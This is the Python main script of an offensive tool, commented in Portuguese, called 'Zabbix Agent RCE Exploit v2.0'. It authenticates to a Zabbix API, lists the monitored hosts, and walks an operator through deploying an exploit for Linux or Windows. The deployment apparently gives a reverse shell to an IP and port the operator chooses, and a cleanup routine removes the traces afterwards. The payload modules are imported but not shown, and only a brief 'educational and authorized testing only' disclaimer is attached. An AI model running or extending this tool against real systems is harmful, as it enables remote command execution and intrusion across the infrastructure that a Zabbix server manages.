#!/usr/bin/env python3
"""
Zabbix Agent RCE Exploit - Versão Reestruturada 2.0
Exploit para execução remota de código em agentes Zabbix

APENAS PARA FINS EDUCACIONAIS E TESTES AUTORIZADOS
Use sob sua própria responsabilidade
"""

import sys
import argparse
import logging
from pathlib import Path

# Adiciona o diretório modules ao path
sys.path.insert(0, str(Path(__file__).parent / 'modules'))

try:
    from modules import (
        ConfigManager, LoggerSetup, ZabbixAPIClient,
        PayloadGenerator, OSDetector, ExploitManager, UserInterface
    )
except ImportError as e:
    print(f"❌ Erro ao importar módulos: {e}")
    print("Certifique-se que todos os arquivos estão presentes na pasta 'modules'")
    sys.exit(1)


class ZabbixRCEApplication:
    """Aplicação principal do Zabbix RCE Exploit"""
    
    def __init__(self, args):
        self.args = args
        self.config = None
        self.logger = None
        self.api_client = None
        self.payload_generator = None
        self.exploit_manager = None
        self.ui = None
        
        # Inicializa componentes
        self._initialize_components()
    
    def _initialize_components(self):
        """Inicializa todos os componentes necessários"""
        try:
            # Carrega configurações
            self.config = ConfigManager()
            
            # Configura logging
            self.logger = LoggerSetup.setup_logger(
                level=self.config.logging.level,
                log_file=self.config.logging.log_file
            )
            
            # Ativa modo verboso se solicitado
            if self.args.verbose:
                LoggerSetup.set_verbose_mode(self.logger)
            
            self.logger.info("Inicializando Zabbix RCE Exploit v2.0")
            
            # Inicializa cliente da API
            self.api_client = ZabbixAPIClient(
                url=self.config.zabbix.url,
                auth_token=self.config.zabbix.auth_token,
                timeout=self.config.zabbix.api_timeout
            )
            
            # Inicializa gerador de payloads
            self.payload_generator = PayloadGenerator()
            
            # Inicializa gerenciador de exploits
            self.exploit_manager = ExploitManager(
                api_client=self.api_client,
                payload_generator=self.payload_generator
            )
            
            # Inicializa interface de usuário
            self.ui = UserInterface(
                api_client=self.api_client,
                exploit_manager=self.exploit_manager,
                payload_generator=self.payload_generator
            )
            
            self.logger.info("Todos os componentes inicializados com sucesso")
            
        except Exception as e:
            print(f"❌ Erro durante inicialização: {e}")
            if hasattr(self, 'logger') and self.logger:
                self.logger.error(f"Erro durante inicialização: {e}")
            sys.exit(1)
    
    def test_connection(self):
        """Testa conexão com a API do Zabbix"""
        self.logger.info("Testando conexão com Zabbix...")
        
        if self.api_client.test_connection():
            self.ui.display_success("Conectado ao Zabbix com sucesso!")
        else:
            self.ui.display_error("Falha ao conectar com o Zabbix. Verifique as configurações.")
            return False
        
        return True
    
    def list_hosts_only(self):
        """Lista hosts e sai"""
        hosts = self.api_client.get_hosts()
        
        if not hosts:
            self.ui.display_error("Não foi possível obter lista de hosts")
            return
        
        self.ui.display_hosts_table(hosts)
        print(f"\n📊 Total de hosts encontrados: {len(hosts)}")
    
    def deploy_exploit_workflow(self):
        """Fluxo completo de implantação de exploit"""
        # Testa conexão primeiro
        if not self.test_connection():
            return
        
        # Obtém lista de hosts
        hosts = self.api_client.get_hosts()
        if not hosts:
            self.ui.display_error("Nenhum host encontrado")
            return
        
        # Exibe hosts disponíveis
        self.ui.display_hosts_table(hosts)
        
        # Seleção do host
        selected_host = self.ui.select_host(hosts)
        if not selected_host:
            self.ui.display_warning("Operação cancelada pelo usuário")
            return
        
        # Seleção da interface
        interface_result = self.ui.select_interface(selected_host)
        if not interface_result:
            self.ui.display_warning("Operação cancelada pelo usuário")
            return
        
        interface, interface_index = interface_result
        
        # Seleção do sistema operacional
        os_type = self.ui.select_os_type(selected_host)
        if not os_type:
            self.ui.display_warning("Operação cancelada pelo usuário")
            return
        
        # Seleção do método de exploit
        method = self.ui.select_exploit_method(os_type)
        if not method:
            self.ui.display_warning("Operação cancelada pelo usuário")
            return
        
        # Configuração de parâmetros
        params = self.ui.get_exploit_parameters(self.config.exploit.ip_shell)
        if not params:
            self.ui.display_warning("Operação cancelada pelo usuário")
            return
        
        ip_shell, port = params
        
        # Confirmação final
        if not self.ui.confirm_exploit_deployment(selected_host, os_type, method, ip_shell, port):
            self.ui.display_warning("Implantação cancelada pelo usuário")
            return
        
        # Implanta o exploit
        self.logger.info(f"Implantando exploit {method} para {os_type} no host {selected_host['host']}")
        
        success = False
        if os_type.lower() == 'linux':
            success = self.exploit_manager.deploy_linux_exploit(
                hostid=selected_host['hostid'],
                interfaceid=interface['interfaceid'],
                ip_shell=ip_shell,
                port=port,
                method=method
            )
        elif os_type.lower() == 'windows':
            success = self.exploit_manager.deploy_windows_exploit(
                hostid=selected_host['hostid'],
                interfaceid=interface['interfaceid'],
                ip_shell=ip_shell,
                port=port,
                method=method
            )
        
        if success:
            self.ui.display_post_exploit_instructions(os_type, method, ip_shell, port)
        else:
            self.ui.display_error("Falha ao implantar exploit")
    
    def cleanup_exploits_workflow(self):
        """Fluxo de limpeza de exploits"""
        # Testa conexão primeiro
        if not self.test_connection():
            return
        
        # Obtém lista de hosts
        hosts = self.api_client.get_hosts()
        if not hosts:
            self.ui.display_error("Nenhum host encontrado")
            return
        
        # Exibe hosts disponíveis
        self.ui.display_hosts_table(hosts)
        
        # Seleção do host
        selected_host = self.ui.select_host(hosts)
        if not selected_host:
            self.ui.display_warning("Operação cancelada pelo usuário")
            return
        
        # Confirma limpeza
        confirm = input(f"\n🧹 Confirma limpeza de exploits no host '{selected_host['host']}'? (s/n): ")
        if confirm.lower() != 's':
            self.ui.display_warning("Limpeza cancelada pelo usuário")
            return
        
        # Executa limpeza
        if self.exploit_manager.cleanup_exploits(selected_host['hostid']):
            self.ui.display_success(f"Exploits removidos do host '{selected_host['host']}'")
        else:
            self.ui.display_error("Falha durante limpeza de exploits")
    
    def interactive_mode(self):
        """Modo interativo principal"""
        self.ui.display_banner()
        
        # Testa conexão inicial
        if not self.test_connection():
            self.ui.pause_for_user("Pressione Enter para tentar novamente ou Ctrl+C para sair...")
            return
        
        self.config.display_config()
        
        while True:
            try:
                choice = self.ui.main_menu()
                
                if choice == '1':
                    self.deploy_exploit_workflow()
                elif choice == '2':
                    self.list_hosts_only()
                elif choice == '3':
                    self.cleanup_exploits_workflow()
                elif choice == '4':
                    self.test_connection()
                elif choice == '5':
                    self.config.display_config()
                elif choice == '6':
                    self.ui.display_success("Encerrando programa...")
                    break
                
                if choice != '6':
                    self.ui.pause_for_user()
                    
            except KeyboardInterrupt:
                print("\n\n⏹️  Operação interrompida pelo usuário")
                break
            except Exception as e:
                self.logger.error(f"Erro inesperado: {e}")
                self.ui.display_error(f"Erro inesperado: {e}")
                self.ui.pause_for_user()
    
    def run(self):
        """Executa a aplicação baseado nos argumentos"""
        try:
            if self.args.list_hosts:
                self.list_hosts_only()
            elif self.args.test_connection:
                self.test_connection()
            else:
                self.interactive_mode()
                
        except KeyboardInterrupt:
            print("\n\n⏹️  Programa interrompido pelo usuário")
        except Exception as e:
            self.logger.error(f"Erro fatal: {e}")
            print(f"\n❌ Erro fatal: {e}")
            sys.exit(1)
        finally:
            if self.logger:
                self.logger.info("Programa finalizado")


def parse_arguments():
    """Parse dos argumentos da linha de comando"""
    parser = argparse.ArgumentParser(
        description='Zabbix Agent RCE Exploit v2.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemplos de uso:
  python zabbix_rce.py                    # Modo interativo
  python zabbix_rce.py --list-hosts       # Lista hosts disponíveis
  python zabbix_rce.py --test-connection  # Testa conexão com Zabbix
  python zabbix_rce.py --verbose          # Modo verboso

⚠️  AVISO: Use apenas para fins educacionais e testes autorizados!
        """
    )
    
    parser.add_argument(
        '--verbose', '-v',
        action='store_true',
        help='Ativa modo verboso (debug)'
    )
    
    parser.add_argument(
        '--list-hosts', '-l',
        action='store_true',
        help='Lista hosts disponíveis e sai'
    )
    
    parser.add_argument(
        '--test-connection', '-t',
        action='store_true',
        help='Testa conexão com Zabbix e sai'
    )
    
    parser.add_argument(
        '--version',
        action='version',
        version='Zabbix RCE Exploit v2.0'
    )
    
    return parser.parse_args()


def main():
    """Função principal"""
    try:
        args = parse_arguments()
        app = ZabbixRCEApplication(args)
        app.run()
        
    except KeyboardInterrupt:
        print("\n\n⏹️  Programa interrompido")
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ Erro fatal durante inicialização: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
